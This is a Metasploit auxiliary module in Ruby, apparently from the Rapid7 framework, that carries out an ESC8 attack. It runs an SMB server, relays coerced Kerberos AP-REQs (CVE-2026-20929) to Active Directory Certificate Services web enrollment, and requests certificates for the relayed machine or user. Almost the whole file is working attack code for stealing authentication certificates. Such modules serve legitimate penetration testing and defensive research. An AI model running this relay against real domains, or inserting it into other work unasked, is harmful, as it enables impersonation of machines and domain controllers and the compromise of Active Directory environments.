##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Relay::Kerberos::RelayServer
  include ::Msf::Exploit::Remote::HttpClient
  include ::Msf::Exploit::Remote::HTTP::WebEnrollment

  def initialize(_info = {})
    super({
      'Name' => 'ESC8 Relay: SMB to HTTP(S) via Kerberos',
      'Description' => %q{
        This module creates an SMB server and relays the Kerberos AP-REQ passed to it
        (for example from a coerced host, CVE-2026-20929) to an AD CS Web Enrollment
        HTTP endpoint to gain an authenticated connection. Once that connection is
        established, the module makes an authenticated request for a certificate based
        on a given template.

        Unlike NTLM, a Kerberos AP-REQ is a complete, self-contained credential bound
        to the SPN the victim was coerced into requesting, so there is no
        challenge/response and the relay is a single request. The captured AP-REQ can
        only be relayed to the service matching that SPN.
      },
      'Author' => [
        'Pushpender Rathore' # Kerberos relay
      ],
      'References' => [
        ['CVE', '2026-20929'],
        ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE],
        ['ATT&CK', Mitre::Attack::Technique::T1649_STEAL_OR_FORGE_AUTHENTICATION_CERTIFICATES]
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 Kerberos relay server' } ]],
      # The relayed connection is already authenticated by the AP-REQ, so
      # follow-up enrollment requests must not attempt to re-authenticate.
      'DefaultOptions' => { 'HTTP::Auth' => 'None' },
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    })

    register_options(
      [
        OptEnum.new('MODE', [ true, 'The issue mode.', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
        OptString.new('CERT_TEMPLATE', [ false, 'The template to issue if MODE is SPECIFIC_TEMPLATE.' ], conditions: %w[MODE == SPECIFIC_TEMPLATE]),
        OptString.new('TARGETURI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
        OptString.new('RELAY_IDENTITY', [ true, 'The coerced principal being relayed (e.g. DOMAIN\\HOST$). The Kerberos AP-REQ carries the identity encrypted, so it is supplied here for template selection and certificate labeling.' ])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true])
      ]
    )
    @issued_certs = {}
  end

  def relay_targets
    Msf::Exploit::Remote::Relay::TargetList.new(
      (datastore['SSL'] ? :https : :http),
      datastore['RPORT'],
      datastore['RHOSTS'],
      datastore['TARGETURI'],
      randomize_targets: datastore['RANDOMIZE_TARGETS']
    )
  end

  def check_host(target_ip)
    res = send_request_raw(
      {
        'rhost' => target_ip,
        'method' => 'GET',
        'uri' => normalize_uri(target_uri),
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )
    disconnect

    return Exploit::CheckCode::Unknown('No response received from target') if res.nil?
    unless res.code == 401
      return Exploit::CheckCode::Safe('The target does not require authentication.')
    end

    unless res.headers['WWW-Authenticate'].to_s.include?('Negotiate')
      return Exploit::CheckCode::Safe('The target does not offer Negotiate (Kerberos) authentication.')
    end

    if datastore['SSL']
      # over SSL, channel binding (EPA) may or may not be enforced, so downgrade to Detected
      Exploit::CheckCode::Detected('Server replied that authentication is required and Negotiate is supported. Target is over SSL, Extended Protection for Authentication (EPA) may or may not be enabled.')
    else
      Exploit::CheckCode::Appears('Server replied that authentication is required and Negotiate is supported.')
    end
  end

  def validate
    errors = {}

    case datastore['MODE']
    when 'SPECIFIC_TEMPLATE'
      if datastore['CERT_TEMPLATE'].blank?
        errors['CERT_TEMPLATE'] = 'CERT_TEMPLATE must be set when MODE is SPECIFIC_TEMPLATE.'
      end
    when 'ALL', 'AUTO', 'QUERY_ONLY'
      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
        print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
      end
    end

    raise OptionValidateError, errors unless errors.empty?

    super
  end

  def run
    relay_targets.each do |target|
      vprint_status("Checking endpoint on #{target}")
      check_code = check_host(target.ip)
      if [Exploit::CheckCode::Unknown, Exploit::CheckCode::Safe].include?(check_code)
        fail_with(Failure::UnexpectedReply, "Web Enrollment does not appear to be enabled on #{target}")
      end
    end

    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    # The AP-REQ carries the client identity encrypted to the target service, so
    # it is not recovered from the wire; fall back to the operator-supplied
    # RELAY_IDENTITY for template selection and certificate labeling.
    identity = relay_identity.presence || datastore['RELAY_IDENTITY']

    case datastore['MODE']
    when 'AUTO'
      cert_template = identity.end_with?('$') ? ['DomainController', 'Machine'] : ['User']
      retrieve_certs(relay_connection, identity, cert_template)
    when 'ALL', 'QUERY_ONLY'
      cert_templates = get_cert_templates(relay_connection)
      unless cert_templates.nil? || cert_templates.empty?
        print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
        print_good("Available Certificates for #{identity}: #{cert_templates.join(', ')}")
        if datastore['MODE'] == 'ALL'
          retrieve_certs(relay_connection, identity, cert_templates)
        end
      end
    when 'SPECIFIC_TEMPLATE'
      retrieve_cert(relay_connection, identity, datastore['CERT_TEMPLATE'])
    end

    vprint_status('Relay tasks complete; waiting for next login attempt.')
    relay_connection.disconnect!
  end
end
